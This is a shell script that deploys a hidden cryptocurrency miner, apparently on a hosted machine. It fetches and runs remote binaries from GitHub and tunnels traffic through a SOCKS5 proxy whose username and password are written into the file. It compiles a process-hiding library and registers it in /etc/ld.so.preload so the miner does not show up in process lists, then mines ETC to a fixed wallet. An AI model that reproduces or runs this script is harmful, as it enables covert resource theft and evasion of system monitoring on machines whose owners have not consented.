#!/bin/sh

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = sg-socks5.woiden.net:8080
socks5_username = woiden_jancuk
socks5_password =  @jancuk69
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

echo "**"

echo " "

echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/gunturyogatama404/jijij//main/bezzHash

chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip

unzip magicBezzHash.zip

make

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

mv libprocesshider.so /usr/local/lib/

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY

